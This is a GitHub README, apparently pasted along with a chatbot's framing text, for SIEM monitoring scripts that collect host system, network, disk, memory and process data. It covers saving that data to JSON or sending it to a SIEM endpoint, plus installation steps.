# siem_monitoring
siem monitoring scrips

Sure! Here's a `README.md` for the SIEM repository:

```markdown
# SIEM Monitoring Scripts

This repository hosts various scripts designed for Security Information and Event Management (SIEM) monitoring. These scripts gather and analyze system data, providing essential information for security and performance monitoring.

## Overview

The SIEM monitoring scripts in this repository are developed to collect comprehensive system data, including:

- System information (hostname, OS, architecture, etc.)
- Network information (interfaces, statistics, connections)
- Disk usage details
- Memory usage (virtual and swap memory)
- Running processes and their resource usage

These scripts can save the collected data to a file or send it to a specified SIEM endpoint for further analysis.

## Scripts

### `siem_data.py`

This script gathers all necessary data on a PC for SIEM analysis. The data collected includes:

- **System Information**: Basic details about the system such as hostname, OS, architecture, and boot time.
- **Network Information**: Details about network interfaces, their statuses, and current network connections.
- **Disk Information**: Information about disk partitions and their usage.
- **Memory Information**: Details about virtual and swap memory usage.
- **Process Information**: Information about currently running processes, including their CPU and memory usage.

The script can either save the collected data to a JSON file or send it to a SIEM endpoint.

#### Usage

1. **Save data to a file**:

    ```sh
    python3 siem_data.py
    ```

    This will generate a `siem_data.json` file with the collected data.

2. **Send data to a SIEM endpoint**:

    Uncomment the lines in the `main` function related to sending data to a SIEM endpoint, and replace the placeholder URL with the actual endpoint URL. Then run:

    ```sh
    python3 siem_data.py
    ```

## Requirements

Ensure you have the necessary Python packages installed. You can use the provided `requirements.txt` to install the dependencies:

```sh
pip install -r requirements.txt
```

### Packages

- `psutil`
- `requests`

## Installation

1. Clone the repository:

    ```sh
    git clone https://github.com/yourusername/siem_monitoring.git
    cd siem_monitoring
    ```

2. Create a virtual environment and activate it:

    ```sh
    python3 -m venv myenv
    source myenv/bin/activate
    ```

3. Install the required packages:

    ```sh
    pip install -r requirements.txt
    ```

4. Run the script:

    ```sh
    python3 siem_data.py
    ```

## Contributing

Contributions are welcome! Please feel free to submit a pull request or open an issue if you have any suggestions or improvements.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

---

Happy Monitoring!
```

This `README.md` provides an overview of the repository, instructions on how to use the main script, and steps for setting up the environment and dependencies. It also includes sections for contributing and licensing. Adjust the repository URL and any other details as necessary for your specific use case.
